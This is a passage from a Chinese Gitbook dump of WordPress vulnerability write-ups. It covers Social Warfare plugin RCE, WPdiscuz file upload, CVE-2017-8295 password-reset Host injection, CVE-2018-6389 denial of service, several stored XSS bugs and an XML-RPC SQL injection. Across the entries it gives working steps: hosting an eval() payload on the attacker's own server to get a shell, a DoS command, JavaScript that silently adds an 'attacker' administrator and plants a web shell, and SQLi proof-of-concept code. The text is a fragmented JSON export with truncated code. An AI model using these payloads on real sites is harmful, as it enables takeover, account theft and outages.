在/wp-content/plugins/social-warfare/lib/utilities/SWP_Database_Migration.php文件中有一处eval()函数，该函数将file_get_contents()读取的文件内容当做PHP代码执行导致RCE。 漏洞利用 第一步：刺探是否安装了Social Warfare插件 访问 http://0-sec.org/wp-content/plugins/social-warfare/readme.txt 如果存在readme.txt文件则说明已经安装该插件，并且从该txt文件中可获知插件的版本。 我的本机环境为3.5.2版本。 第二步：在自己的VPS服务器上放置一个code.txt文件，并启动HTTP服务使该文件可通过HTTP访问。文件内容如下： eval($_REQUEST['wpaa']) 第三步：在未登陆任何账号的情况下直接访问如下链接即可getshell。 http://0-sec.org/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://your_ip/code.txt&wpaa=phpinfo(); image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:07 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞/WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞/WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞.html","title":"WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞","keywords":"","body":"WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞 一、漏洞简介 二、漏洞影响 WPdiscuz 7.0.0 - WPdiscuz 7.0.4 三、复现过程 漏洞分析 1.环境搭建后，手动安装wpdiscuz插件后，看到文章下增加评论模块 2.phpstorm导入web目录，点击图片按钮，上传一个php文件测试一下，上传路径是http://www.0-sec.org:8888/wordpress/wp-admin/admin-ajax.php，默认是上传不了的。 3.从入口点分析，如图是wp_filter的action过滤 4.跟进去，可以看到上传的功能点，再进去 5.可以看到如图位置，使用getMimeType方法根据文件内容获取文件类型，并不是通过文件后缀名判断，进一步根据$mineType判断是否是允许的上传类型。 6.跟入查看isAllowedFileType方法，在判斷$mineType是否在$this -> options -> content[\\\"wmuMimeTypes\\\"]中存在。 7.如图，进入$options中，可以content[\\\"wmuMimeTypes\\\"]使用三目运算判断，搜索上下文得知，结果就是$defaultOptions[self::TAB_CONTENT][\\\"wmuMimeTypes\\\"] 8.进入$defaultOptions中可以得到最终$this -> options -> content[\\\"wmuMimeTypes\\\"]的值是几种常见的图片类型。 9.很明显此时文件类型已经通过getMimeType()方法修改为text/plain了，但是回到进入isAllowedFileType的代码，发现程序只在此处对上传文件进行了判断后，直接保存了文件。 漏洞复现 如此，程序只是根据文件内容判断文件类型，并未对文件后缀进行效验，构造一个图片马，或者手动在webshell前面加上图片头信息即可绕过。 1.把后门文件追加到图片后 2.上传并修改后缀名为php，可以看到返回路径 3.连接webshell poc import requests import re import sys class wpdiscuz(): def __init__(self): self.s = requests.session() self.s.headrs = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66\" } self.nonce = \"\" self.state = False def check(self, url): res = self.s.get(url=url) pat1 = \"wpdiscuz/themes/default/style\\.css\\?ver=(.*?)'\" reSearch1 = re.search(pat1, res.text) if reSearch1 == None: print(\"%s 评论插件不存在任意文件漏洞\" % url) return mess = reSearch1.group(0) version = reSearch1.group(1) # 判断版本 vers = version.split(\".\") if (len(vers) == 3): if int(vers[0]) == 7: if int(vers[2]) 参考链接 https://xz.aliyun.com/t/8138\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:09 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏/（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏/（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏.html","title":"（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏","keywords":"","body":"（CVE-2017-6514）敏感信息泄漏 一、漏洞简介 二、漏洞影响 三、复现过程 CVE-2017-6514通过CFSECURITE查找获得WORDPRESS登录可能的源代码披露 http://www.0-sec.org/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.0-sec.org% 2F＆format = xm Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:38 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2017-8295）WordPress =4.8.3 任意密码重置_HOST头注入漏洞/（CVE-2017-8295）WordPress =4.8.3 任意密码重置_HOST头注入漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2017-8295）WordPress =4.8.3 任意密码重置_HOST头注入漏洞/（CVE-2017-8295）WordPress =4.8.3 任意密码重置_HOST头注入漏洞.html","title":"（CVE-2017-8295）WordPress =4.8.3 任意密码重置_HOST头注入漏洞","keywords":"","body":"（CVE-2017-8295）WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞 一、漏洞简介 在 WordPress 2.3-4.8.3 版本中找回密码功能未正确设置发送邮件的信息，在发送找回密码邮件的过程中直接使用 Host 地址作为邮件请求头的一部分，在一些情况下攻击者可利用该功能窃取找回密码邮件内容。 二、漏洞影响 WordPress 2.3-4.8.3 三、复现过程 漏洞分析 在 WordPress 中， wp_mail() 函数用来发送邮件，在发送邮件的过程中如果没有设置 发件地址（From） ，则会自动使用 \\'wordpress@\\' + $_SERVER[\\'SERVER_NAME\\'] 作为邮件的 发件地址。主流的 Web 服务器中的 SERVER_NAME 变量来自于客户端请求中 HTTP_HOST 头，这就意味着该发件地址是用户可控的。 wp_mail() 函数的声明在文件 WordPress/wp-includes/pluggable.php 中： function wp_mail( $to, $subject, $message, $headers = '', $attachments = array() ) { ...//ignore if ( !isset( $from_email ) ) { // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER['SERVER_NAME'] ); if ( substr( $sitename, 0, 4 ) == 'www.' ) { $sitename = substr( $sitename, 4 ); } $from_email = 'wordpress@' . $sitename; } /** * Filters the email address to send from. * * @since 2.2.0 * * @param string $from_email Email address to send from. */ $from_email = apply_filters( 'wp_mail_from', $from_email ); /** * Filters the name to associate with the \"from\" email address. * * @since 2.3.0 * * @param string $from_name Name associated with the \"from\" email address. */ $from_name = apply_filters( 'wp_mail_from_name', $from_name ); $phpmailer->setFrom( $from_email, $from_name ); ...//ignore } 在某些情况下邮件服务器会直接将邮件的 发件地址 作为 退件地址（Return-Path），当邮件发送失败时邮件会被自动转发到 退件地址。因为 发件地址 可被篡改，因此找回密码邮件的内容可能会被发送到恶意的邮件服务器中。 漏洞复现 安装 WordPress 程序 此处的管理员邮箱设置为不存在的邮箱地址 demo\\@0-sec.org，用来模拟通过DNS攻击/DOS攻击使管理员的找回密码邮件发送失败 WordPress 创建邮箱账户 演示中我们使用的是 wordpress\\@0-sec.org 通过在线终端，发起找回密码请求，并篡改 HTTP_HOST 请求头 我们这里使用在线终端模拟攻击内网的 WordPress 网站。 在线终端中执行： curl -v 'http://0-sec.org/wp-login.php?action=lostpassword' -H 'Host: vulnspy.com' --data 'user_login=admin&redirect_to=&wp-submit=Get+New+Password' WordPress post数据包： POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1 Host: injected-attackers-mxserver.com Content-Type: application/x-www-form-urlencoded Content-Length: 56 user_login=admin&redirect_to=&wp-submit=Get+New+Password 如果此时邮件发送失败，邮件会被自动退回到 wordpress\\@0-sec.org。即原本要发送管理员邮箱 demo\\@0-sec.org 的邮件会被发送到 wordpress\\@0-sc.org 使用 wordpress\\@0-sec.org 接收找回密码邮件 如果利用成功 wordpress\\@v0-sec.org 会接收到密码重置邮件。 WordPress 如果邮件内容没有显示找回密码链接，可以通过邮件源文件发现找回密码链接 WordPress 使用找回密码链接修改密码 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:39 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2018-6389）WordPress = 4.9.x 拒绝服务漏洞/（CVE-2018-6389）WordPress = 4.9.x 拒绝服务漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2018-6389）WordPress = 4.9.x 拒绝服务漏洞/（CVE-2018-6389）WordPress = 4.9.x 拒绝服务漏洞.html","title":"（CVE-2018-6389）WordPress = 4.9.x 拒绝服务漏洞","keywords":"","body":"（CVE-2018-6389）WordPress \\ 一、漏洞简介 二、漏洞影响 WordPress \\ 三、复现过程 漏洞分析 在文件 WordPress/wp-admin/load-scripts.php 中： registered ) ) { continue; } $path = ABSPATH . $wp_scripts->registered[ $handle ]->src; $out .= get_file( $path ) . \"\\n\"; } ...//ignore echo $out; exit; load-scripts.php 文件会根据load参数传入的文件名依次载入文件并输出。同时程序对load参数的内容进行了过滤，只有在白名单$wp_scripts中的JS文件才会被载入。 该JS文件白名单的内容在文件 WordPress/wp-includes/script-loader.php 中： ...//ignore $scripts->add( 'wp-lists', \"/wp-includes/js/wp-lists$suffix.js\", array( 'wp-ajax-response', 'jquery-color' ), false, 1 ); // WordPress no longer uses or bundles Prototype or script.aculo.us. These are now pulled from an external source. $scripts->add( 'prototype', 'https://ajax.googleapis.com/ajax/libs/prototype/1.7.1.0/prototype.js', array(), '1.7.1' ); $scripts->add( 'scriptaculous-root', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.js', array( 'prototype' ), '1.9.0' ); $scripts->add( 'scriptaculous-builder', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/builder.js', array( 'scriptaculous-root' ), '1.9.0' ); $scripts->add( 'scriptaculous-dragdrop', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/dragdrop.js', array( 'scriptaculous-builder', 'scriptaculous-effects' ), '1.9.0' ); ...//ignore $scripts->add( 'jquery-ui-sortable', \"/wp-includes/js/jquery/ui/sortable$dev_suffix.js\", array( 'jquery-ui-mouse' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-spinner', \"/wp-includes/js/jquery/ui/spinner$dev_suffix.js\", array( 'jquery-ui-button' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-tabs', \"/wp-includes/js/jquery/ui/tabs$dev_suffix.js\", array( 'jquery-ui-core', 'jquery-ui-widget' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-tooltip', \"/wp-includes/js/jquery/ui/tooltip$dev_suffix.js\", array( 'jquery-ui-core', 'jquery-ui-widget', 'jquery-ui-position' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-widget', \"/wp-includes/js/jquery/ui/widget$dev_suffix.js\", array( 'jquery' ), '1.11.4', 1 ); ...//ignore JS文件白名单中共有181个文件。如果我们请求 load-scripts.php 文件使其同时载入全部JS文件，PHP代码将要进行181次的读取操作。若同时发起多个载入全部JS文件的请求，这将极大地消耗服务器资源，即有可能导致网站无法正常响应其他用户的请求。 漏洞利用 https://github.com/ianxtianxt/CVE-2018-6389 python doser.py -g 'http://0-sec.org/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 100 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:40 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss/（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss/（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss.html","title":"（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss","keywords":"","body":"（CVE-2019-16219）内置编辑器Gutenberg 储存型xss 一、漏洞简介 Gutenberg编辑器无法过滤\"简码\"错误消息中的JavaScript / HTML代码，导致可执行任意JavaScript / HTML代码 二、漏洞影响 wordpress 5.0到5.0.4、5.1和5.1.1 三、复现过程 在WordPress 5.0中，用户可以在帖子中添加Shortcode块。当在Shortcode块中添加某些HTML编码字符（例如\"＆lt;\"），然后重新打开该帖子时，它将显示错误消息，并通过将\"＆lt;\"解码为\" \\ 图1.将HTML编码的字符插入Shortcode块 WordPress5.2.3内置编辑器Gutenberg储存型xss/media/rId24.png) 图2.带有预览的Shortcode错误消息 WordPress5.2.3内置编辑器Gutenberg储存型xss/media/rId25.png) 可以通过PoC \"> 轻松绕过此预览中的XSS过滤器。 图3.将PoC代码插入Shortcode块 WordPress5.2.3内置编辑器Gutenberg储存型xss/media/rId26.png) 当任何受害者查看此帖子时，XSS代码将在其浏览器中执行。 WordPress5.2.3内置编辑器Gutenberg储存型xss/media/rId27.png) 如果受害者恰巧具有管理员权限，则攻击者可以利用此漏洞来控制管理员的帐户，将WordPress内置功能用于GetShel Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:44 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-16773）WordPress 5.3.0 储存型xss/（CVE-2019-16773）WordPress 5.3.0 储存型xss.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-16773）WordPress 5.3.0 储存型xss/（CVE-2019-16773）WordPress 5.3.0 储存型xss.html","title":"（CVE-2019-16773）WordPress 5.3.0 储存型xss","keywords":"","body":"（CVE-2019-16773）WordPress 5.3.0 储存型xss 一、漏洞简介 WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。 WordPress 3.7版本至5.3.0版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 WordPress 3.7版本至5.3.0 三、复现过程 如果论坛用户的个人资料显示在其个人资料页面中，则此方法有效。以管理员身份登录并转到外观->自定义，然后进入BuddyPress Nouveu->成员首页，并确保启用了显示用户个人资料的功能 创建普通论坛用户帐户 登录并编辑您的个人资料。将用户描述修改为一下代码 This is a PoC for a Stored XSS 访问您的配置文件并将鼠标悬停在链接上。 参考链接 https://hackerone.com/reports/509930 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:46 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-17671）Wordpress = 5.2.3未授权访问/（CVE-2019-17671）Wordpress = 5.2.3未授权访问.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-17671）Wordpress = 5.2.3未授权访问/（CVE-2019-17671）Wordpress = 5.2.3未授权访问.html","title":"（CVE-2019-17671）Wordpress = 5.2.3未授权访问","keywords":"","body":"（CVE-2019-17671）Wordpress未授权访问 一、漏洞简介 wordpress 爆出最新的查看未经身份验证的文章漏洞， 该漏洞源于程序没有正确处理静态查询， 攻击者可利用该漏洞未经认证查看部分内容 二、漏洞影响 WordPress \\ 三、复现过程 Wordpress 登陆后台新建私密页面 Wordpress 随便填入内容，选择私密，发布 Wordpress 访问前台页面，退出登陆，模拟外部访问 Wordpress 漏洞利用 直接访问，查看不了私密文章 Wordpress 输入payload访问，即可未授权访问所有文章 url+/?static=1&order=asc image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:46 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-6977）WordPress 5.0 rce/（CVE-2019-6977）WordPress 5.0 rce.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2019-6977）WordPress 5.0 rce/（CVE-2019-6977）WordPress 5.0 rce.html","title":"（CVE-2019-6977）WordPress 5.0 rce","keywords":"","body":"（CVE-2019-6977）WordPress 5.0 RCE 一、漏洞简介 漏洞条件：拥有一个author权限的账号 二、漏洞影响 影响包括windows、linux、mac在内的服务端，后端图片处理库为gd/imagick都受到影响，只不过利用难度有所差异。 其中，原文提到只影响release 5.0.0版，但现在官网上可以下载的5.0.0已经修复该漏洞。实际在WordPress 5.1-alpha-44280更新后未更新的4.9.9~5.0.0的WordPress都受到该漏洞影响。 三、复现过程 传图片 WordPress5.0rce/media/rId24.png) 改信息 WordPress5.0rce/media/rId25.png) 保留该数据包，并添加POST &meta_input[_wp_attached_file]=2019/02/2-4.jpg#/../../../../themes/twentynineteen/32.jpg 触发需要的裁剪 WordPress5.0rce/media/rId26.png) 裁剪 WordPress5.0rce/media/rId27.png) 同理保留改数据包，并将POST改为下面的操作，其中nonce以及id不变 action=crop-image&_ajax_nonce=8c2f0c9e6b&id=74&cropDetails[x1]=10&cropDetails[y1]=10&cropDetails[width]=10&cropDetails[height]=10&cropDetails[dst_width]=100&cropDetails[dst_height]=100 触发需要的裁剪 WordPress5.0rce/media/rId28.png) 图片已经过去了 WordPress5.0rce/media/rId29.png) 包含，我们选择上传一个test.txt，然后再次修改信息，如前面 &meta_input[_wp_page_template]=cropped-32.jpg WordPress5.0rce/media/rId30.png) 点击查看附件页面，如果图片被裁剪之后仍保留敏感代码，则命令执行成功。 WordPress5.0rce/media/rId31.png) 四、参考链接 https://www.freebuf.com/vuls/196514.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:41 "},"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2020-4046）WordPress  5.3.4 储型XSS/（CVE-2020-4046）WordPress  5.3.4 储型XSS.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（CVE-2020-4046）WordPress  5.3.4 储型XSS/（CVE-2020-4046）WordPress  5.3.4 储型XSS.html","title":"（CVE-2020-4046）WordPress  5.3.4 储型XSS","keywords":"","body":"（CVE-2020-4046）WordPress 5.3.4 储型XSS 一、漏洞简介 该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 WordPress 5.3.4版本，5.2.7版本，5.1.6版本，5.0.10版本，4.9.15版本，4.8.14版本，4.7.18， 4.6.19版本，4.5.22版本，4.4.23版本，4.3.24版本，4.2.28版本，4.1.31版本，4.0.31版本，3.9.32版本，3.8.34版本，3.7.34版本。 三、复现过程 要利用该漏洞，攻击者需要在其自身的web服务器上托管两个文件（这些文件的内容将在后面显示）。为使漏洞利用正常进行，被攻击的目标服务器必须能访问攻击者web服务器以下载payload。虽然WordPress有健全的外部资源引用控制机制，但是此类安全设置将会阻止WordPress嵌入其它正常的URL，因此实际场景中开启此安全设置是比较少见的。我们基于@g0blinResearch师傅的文章生成payload。然后将payload中插件地址修改为hello.php（也就是/wp-content/plugins/hello.php），该插件为WordPress默认插件且可以访问，同时进行了其他一些小的改动。该payload使用https://eve.gd/2007/05/23/string-fromcharcode-encoder/在线工具进行编码，以避免各种转义问题。在此演示中，对应的payload.htm如下： payload.json部分如下，（没有给出完整的利用代码是为了避免漏洞在未修复前被恶意利用）： { \"type\":\"rich\", \"html\":\"\" } 现在，我们用至少具有贡献者权限的账户登录目标站点，随后创建一个帖子以嵌入我们payload： WordPress5.3.4储型XSS/media/rId24.png) 管理员随后查看帖子时： WordPress5.3.4储型XSS/media/rId25.png)WordPress5.3.4储型XSS/media/rId26.png) 我们的payload已执行，并且对应/wp-content/plugins/hello.php文件被编辑成允许我们执行任意系统命令： WordPress5.3.4储型XSS/media/rId27.png) 参考链接 https://xz.aliyun.com/t/7929 https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:49 "},"Web安全/Wordpress/Wordpress 系统漏洞/（从xss到getshell） xss的深层次利用与探讨/（从xss到getshell） xss的深层次利用与探讨.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/（从xss到getshell） xss的深层次利用与探讨/（从xss到getshell） xss的深层次利用与探讨.html","title":"（从xss到getshell） xss的深层次利用与探讨","keywords":"","body":"（从xss到getshell） xss的深层次利用与探讨 今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。 如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流 联系邮箱：ian\\@lcx.cc 通过js文件添加wp系统管理员 1、创建管理账号 举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin [.] js（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为\" attacker\"，密码为\" attacker\"。 // Send a GET request to the URL '/wordpress/wp-admin/user-new.php', and extract the current 'nonce' value var ajaxRequest = new XMLHttpRequest(); var requestURL = \"/wordpress/wp-admin/user-new.php\"; var nonceRegex = /ser\" value=\"([^\"]*?)\"/g; ajaxRequest.open(\"GET\", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; // Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator var params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator\"; ajaxRequest = new XMLHttpRequest(); ajaxRequest.open(\"POST\", requestURL, true); ajaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); ajaxRequest.send(params); 然后，攻击者可以使用以下PoC插入JavaScript。 “\">” 图1.插入XSS代码以添加管理员帐户 xss的深层次利用与探讨/media/rId24.png) 具有高权限的受害者查看此帖子后，将创建管理员帐户\"攻击者\"。 图2. XSS代码被执行 xss的深层次利用与探讨/media/rId26.png) 图3. XSS代码创建的具有管理员权限的\"攻击者\"帐户 xss的深层次利用与探讨/media/rId28.png) 然后，攻击者可以将现有的php文件修改为Webshel​​l，并使用该Webshel​​l来控制Web服务器。 图4.使用攻击者的帐户添加一个Web Shell xss的深层次利用与探讨/media/rId29.png) 图5.控制Web服务器 xss的深层次利用与探讨/media/rId30.png) 2、恶意命令执行 // Send a GET request to the URL '/wp-admin/plugin-editor.php?akisment/index.php', and extract the current 'nonce' value var ajaxRequest = new XMLHttpRequest(); var requestURL = \"/wp-admin/plugin-editor.php?file=akismet/index.php\" var nonceRegex = /ce\" value=\"([^\"]*?)\"/g; ajaxRequest.open(\"GET\", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; // Construct a POST query, using the previously extracted 'nonce' value, and update the content of the file 'akismet/index.php' with our tiny web shell var params = \"_wpnonce=\"+nonce+\"&newcontent=一旦此XSS被管理用户触发，我们应该能够通过向脚本 http://0-sec.org/wp-content/plugins/akismet/index.php 发送GET / POST请求来执行任意PHP代码，其中参数\" x\"等于我们的PHP代码的\" base6 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:51 "},"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress = 4.7.4 XML-RPC API POST META 未校验漏洞/Wordpress = 4.7.4 XML-RPC API POST META 未校验漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress = 4.7.4 XML-RPC API POST META 未校验漏洞/Wordpress = 4.7.4 XML-RPC API POST META 未校验漏洞.html","title":"Wordpress = 4.7.4 XML-RPC API POST META 未校验漏洞","keywords":"","body":"Wordpress \\ 一、漏洞简介 二、漏洞影响 三、复现过程 中文版 以作者身份登录到您的wordpress 上传图片 记住图像/媒体的ID 创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元） 记住帖子ID 我们可以通过修改_thumbnail_id的值来编辑的值（6是帖子ID，5是图片/帖子ID） poc $usr = 'author'; $pwd = 'author'; $xmlrpc = 'http://local.target/xmlrpc.php'; $client = new IXR_Client($xmlrpc); $content = array(\"ID\" => 6, 'meta_input' => array(\"_thumbnail_id\"=>\"xxx\")); $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content); 通过这段代码，我们在数据库中添加以下负载 5 %1$%s hello 执行SQL负载 使用作者帐户登录管理面板，转到媒体，例如 http://0-sec.org/wp-admin/upload.php 通过_wpnonce参数可以直接进行sql注入 http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello 其中5 %1$%s hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误） SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello' 这证明了Wordpress中的sql漏洞，正如5%1$%s之后的前一个post值中提到的，hello就是我们的payload 英文原文 In order to understand the writing here, you need to read the previous explanation https://medium.com/websec/wordpress-sqli-bbb2afcc8e94. If you got it, then we can jump to the part and solve the question e.g. how to update / insert our sql payload into _thumbnail_id post meta. PoC start Login to your wordpress as author Upload image Remember ID of the image / media Create post and set image as featured image (this creates _thumbnail_id post meta) Remember the post ID Wordpress ≤ 4.7.4 XML-RPC n case of appropriate wordpress version then we can use the third vulnerability in this versions of wordpress https://wordpress.org/news/2017/05/wordpress-4-7-5/ e.g. Lack of capability checks for post meta data in the XML-RPC API. This means that we can edit the value of _thumbnail_id with the following code ( 6 is the post ID and 5 is image/post ID ) $usr = 'author'; $pwd = 'author'; $xmlrpc = 'http://local.target/xmlrpc.php'; $client = new IXR_Client($xmlrpc); $content = array(\"ID\" => 6, 'meta_input' => array(\"_thumbnail_id\"=>\"5 %1$%s hello\")); $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content); and with this code we add the following payload in the DB 5 %1$%s hello Wordpress importer plugin --- any version of wordpress This is another approach for changing the _thumbnail_id value in the database. If wordpress instance have enabled this plugin on it, then simple export, change meta value and import will do the job. Execute the SQL payload Login to the administration panel with your author account, go to media e.g. http://local.target/wp-admin/upload.php , grab the _wpnonce value and we are ready to prove our SQLi vulnerability. Issue the following request towards your local instance: local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello where 5%20%251%24%25s%20hello is url encoded 5 %1$%s hello. This request will result with execution of the following query against the DB (will rise error of course): SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello' This proves the SQLi vulnerability in the wordpress and as mention in previous post value after 5 %1$%s e.g. hello is our payload Is this vulnerability dangerous? SQL injection itself is quite dangerous vulnerability, but sometimes have its own limitations. Here at our case depending of the database server configuration or mysql client used on PHP side could be fatal, but in our case best case scenario would be blind sql injection. Sure, we all know the trivial attack vector, but here we have 2 facts that go against wordpress: meta value database column type e.g. size constraint media parameter could be POST parameter e.g. will have huge size This two facts guide us to the conclusion that even with blind sqli one query would be enough to calculate some crucial DB cell value. Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:34 "},"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress = 4.8.2 POST META 校验绕过漏洞/Wordpress = 4.8.2 POST META 校验绕过漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress = 4.8.2 POST META 校验绕过漏洞/Wordpress = 4.8.2 POST META 校验绕过漏洞.html","title":"Wordpress = 4.8.2 POST META 校验绕过漏洞","keywords":"","body":"Wordpress \\ 一、漏洞简介 二、漏洞影响 三、复现过程 一个MySQL的trick 1). 正常的条件查询语句 mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id'; +---------+---------+----------------+------------+ | meta_id | 